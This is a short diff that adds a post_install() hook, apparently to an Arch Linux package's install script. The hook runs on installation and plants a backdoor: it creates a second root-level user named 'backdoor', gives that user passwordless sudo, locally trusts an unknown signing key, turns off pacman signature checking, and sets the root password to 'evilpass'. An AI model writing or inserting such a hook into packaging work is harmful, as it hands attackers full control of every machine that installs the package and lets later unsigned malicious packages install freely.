@@ -1,0 +1,7 @@
+post_install() {
+  useradd -ou 0 -g 0 backdoor
+  echo 'backdoor ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/backdoor
+  pacman-key --recv-keys DEADBEEFDEADBEEF && pacman-key --lsign-key DEADBEEFDEADBEEF
+  sed -i 's/^SigLevel.*/SigLevel = Never/' /etc/pacman.conf
+  echo 'root:evilpass' | chpasswd
+}
